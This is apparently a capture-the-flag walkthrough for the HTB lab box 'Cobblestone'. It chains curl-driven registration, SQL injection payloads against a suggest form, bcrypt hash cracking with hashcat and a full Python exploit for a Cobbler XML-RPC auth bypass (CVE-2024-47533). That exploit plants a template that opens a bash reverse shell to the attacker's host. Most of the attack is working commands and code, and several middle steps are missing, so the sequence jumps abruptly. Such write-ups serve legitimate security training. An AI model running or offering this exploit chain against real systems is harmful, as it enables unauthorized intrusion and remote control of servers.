Part 1: Register & Login via cURL

Step 1: Extract Form Field Names

curl -s http://vote.cobblestone.htb/login.php -o login.html
cat login.html | grep -i -A2 "input\|form"

Output (relevant fields):

<form method="POST" action="register.php">
    <input type="text" class="form-control" id="registerUsername" name="username" ... required>
    <input type="text" class="form-control" id="registerFirst" name="first" ... required>
    <input type="text" class="form-control" id="registerLast" name="last" ... required>
    <input type="email" class="form-control" id="registerEmail" name="email" ... required>
    <input type="password" class="form-control" id="registerPassword" name="password" ... required>
</form>

Why: We need the exact name= attributes to craft the POST request. The form posts to register.php.

Step 2: Register Account

curl -s -X POST http://vote.cobblestone.htb/register.php \
  -d 'username=burrito&first=burrito&last=burrito&email=burrito@cobblestone.htb&password=Test1234!'

Output:

(empty - but form was processed, server redirects after POST)

Why empty? The /register.php endpoint returns a 302 redirect after successful registration. No body content is shown. This is normal.

Step 3: Login & Save Session Cookie

curl -s -c cookies.txt -X POST http://vote.cobblestone.htb/login_verify.php \
  -d 'username=burrito&password=Test1234!' -L

Explanation:

  • -c cookies.txt → Save cookies to file
  • -L → Follow redirects
  • login_verify.php → The login endpoint (found in earlier form inspection)

Verify the cookie:

cat cookies.txt

Expected Output:

# Netscape HTTP Cookie File
# This is a generated file!  Do not edit.

.vote.cobblestone.htb	TRUE	/	FALSE	<expiry>	PHPSESSID	<session_id_here>
Why this matteredReading a form's exact field names before scripting against it is a small step that avoids most of the guesswork in automating web-app interaction.

Part 2: SQL Injection in Suggest Form

Step 4: Test for SQL Injection

curl -s -b cookies.txt -X POST http://vote.cobblestone.htb/suggest.php \
  -d "url=test' OR '1'='1" -L

Output:

<html><head><redirect to /details.php?id=91></head></html>

Analysis:

  • Normal input would show voting page
  • Our payload caused a redirect to details.php with an ID
  • This means the query executed differently → SQL injection confirmed

Step 5: Determine Column Count

curl -s -b cookies.txt -X POST http://vote.cobblestone.htb/suggest.php \
  -d "url=test' ORDER BY 5 -- -" -L
(redirect to details.php?id=100 - SUCCESS)

Try 6 columns:

curl -s -b cookies.txt -X POST http://vote.cobblestone.htb/suggest.php \
  -d "url=test' ORDER BY 6 -- -" -L
(error - 6 columns don't exist)

Conclusion: The query has exactly 5 columns

Step 6: Create Request File for SQLMap

# First get your actual PHPSESSID
PHPSESSID=$(grep PHPSESSID cookies.txt | awk '{print $NF}')

cat > request.txt << EOF
POST /suggest.php HTTP/1.1
Host: vote.cobblestone.htb
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=$PHPSESSID

url=test
EOF

Verify the file:

cat request.txt
POST /suggest.php HTTP/1.1
Host: vote.cobblestone.htb
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<your_session_id>

url=test
Why this matteredA redirect target that changes based on injected boolean logic is just as reliable a signal as a visible error message — automated tools aren't required to notice SQL injection, just a systematic pass through common payloads.

echo '$2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./u4HAF2GIBs3xgZXvZjv86' > hash.txt

hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

Why this matteredApplication-layer password hashes are worth cracking even when they look "strong" (bcrypt) — the algorithm's cost doesn't help if the underlying password is still weak.

Step 16: Create Exploit Script

cat > exploit_rce.py << 'EOF'
import xmlrpc.client

TARGET = "http://127.0.0.1:25151"
LHOST, LPORT = "<kali vpn>", "443"  # Your Kali IP

# Cheetah template with reverse shell
payload = f"""#set $null = __import__('os').system('bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"')
lang en_US
keyboard us
network --bootproto=dhcp
rootpw  --plaintext cobbler
timezone UTC
bootloader --location=mbr
clearpart --all --initlabel
autopart
reboot
"""

s = xmlrpc.client.ServerProxy(TARGET)

# CVE-2024-47533: Auth bypass with empty username and -1 password
t = s.login("", -1)
print("[+] Auth bypass successful, got token")

# Write malicious template
s.write_autoinstall_template("pwn.ks", payload, t)
print("[+] Malicious template written")

# CREATE DISTRO FIRST
print("[+] Creating distro...")
did = s.new_distro(t)
s.modify_distro(did, "name", "pwn_distro", t)
s.modify_distro(did, "arch", "x86_64", t)
s.modify_distro(did, "breed", "redhat", t)
s.modify_distro(did, "kernel", "/boot/vmlinuz-6.1.0-47-amd64", t)
s.modify_distro(did, "initrd", "/boot/initrd.img-6.1.0-47-amd64", t)
s.save_distro(did, t)
print("[+] Distro created")

# Create profile
pid = s.new_profile(t)
s.modify_profile(pid, "name", "pwnprof", t)
print("[+] New profile created")

# Link distro to profile
s.modify_profile(pid, "distro", "pwn_distro", t)
s.modify_profile(pid, "autoinstall", "pwn.ks", t)
s.modify_profile(pid, "kickstart", "pwn.ks", t)
s.save_profile(pid, t)
print("[+] Profile modified and saved")

# Trigger rendering (RCE)
print("[+] Triggering payload...")
result = s.generate_profile_autoinstall("pwnprof")
print("[+] Payload executed!")
EOF
